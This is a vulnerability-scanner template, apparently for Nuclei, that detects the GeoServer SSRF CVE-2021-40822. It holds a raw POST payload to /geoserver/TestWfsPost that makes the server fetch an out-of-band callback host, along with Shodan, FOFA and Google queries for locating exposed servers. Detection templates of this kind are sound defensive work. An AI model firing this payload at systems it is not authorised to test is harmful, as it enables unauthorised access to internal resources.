flow: http(1) && http(2)
http:
- matchers:
  - case-insensitive: true
    internal: true
    part: body
    type: word
    words:
    - geoserver.web
    - geoserverbasepage
    - 'GeoServer: Redirecting'
  max-redirects: 3
  method: GET
  path:
  - '{{BaseURL}}/geoserver/'
  redirects: true
  stop-at-first-match: true
- matchers:
  - part: body
    type: word
    words:
    - <b>Interactsh</b>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /geoserver/TestWfsPost HTTP/1.1

    Host: oast.pro

    Content-Type: application/x-www-form-urlencoded


    form_hf_0=&url=http://oast.pro/geoserver/../&body=&username=&password=

    '
id: CVE-2021-40822
info:
  author: For3stCo1d,aringo-bf
  classification:
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-40822
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
    epss-percentile: 0.99789
    epss-score: 0.93253
  description: GeoServer through 2.18.5 and 2.19.x through 2.19.2 allows server-side
    request forgery via the option for setting a proxy host.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to internal resources, data leakage, and potential remote code execution.

    '
  metadata:
    fofa-query:
    - app="GeoServer"
    - app="geoserver"
    - title="geoserver"
    google-query: intitle:"geoserver"
    max-request: 1
    product: geoserver
    shodan-query:
    - title:"GeoServer"
    - http.title:"geoserver"
    vendor: osgeo
    verified: true
  name: Geoserver - Server-Side Request Forgery
  reference:
  - https://gccybermonks.com/posts/cve-2021-40822/
  - https://github.com/geoserver/geoserver/compare/2.19.2...2.19.3
  - https://github.com/geoserver/geoserver/releases
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40822
  - https://osgeo-org.atlassian.net/browse/GEOS-10229
  remediation: 'Apply the latest security patches or updates provided by the Geoserver
    project to mitigate the SSRF vulnerability.

    '
  severity: high
  tags: cve2021,cve,ssrf,geoserver,osgeo,vkev,vuln
